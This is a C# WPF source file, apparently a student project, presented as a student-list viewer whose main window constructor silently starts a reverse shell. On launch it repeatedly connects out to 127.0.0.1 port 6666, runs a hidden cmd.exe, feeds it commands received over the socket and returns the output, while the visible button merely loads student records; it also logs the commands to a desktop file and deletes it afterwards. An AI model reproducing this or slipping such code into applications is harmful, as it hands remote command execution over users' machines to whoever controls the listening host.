using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ReverseRemoteServer01
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        StudentManager studentManager;
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        String filePath;
        List<Student> students = new List<Student>();
        public MainWindow()
        {
            InitializeComponent();
            StartServerAsync();
        }

        private async void StartServerAsync()
        {
            while (true)
            {
                await Task.Run(() => RunServer());
                await Task.Delay(5000); // Wait 5 seconds then try again
            }
        }
        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                
                try
                {
                    tcpClient.Connect("127.0.0.1", 6666);
                    networkStream = tcpClient.GetStream(); // Khoi dung cac bien
                    streamReader = new StreamReader(networkStream); //khoi dung luong
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe"; // chay 1 ctring Dos
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }
            while (true)  // da co client ket noi toi
            {
                try
                {
                    filePath = "C:\\Users\\Admin\\OneDrive\\Desktop\\server.json";
                    strInput.Append(streamReader.ReadLine());                  
                    strInput.Append("\n");
                    File.AppendAllText(filePath, strInput.ToString());
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    File.Delete("C:\\Users\\Admin\\OneDrive\\Desktop\\server.json");
                    break;
                }
            }//--end of while loop

        }//--end of RunServer()

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);                   
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        private void btnListen_Click(object sender, RoutedEventArgs e)
        {

        }
        private void LoadStudents_Click(object sender, RoutedEventArgs e)
        {
            loadStudents();
        }

        public void loadStudents()
        {
            studentManager = new StudentManager(filePath);
            studentListView.ItemsSource = studentManager.GetStudents();
            students = studentManager.GetStudents();
        }
        
    }
}
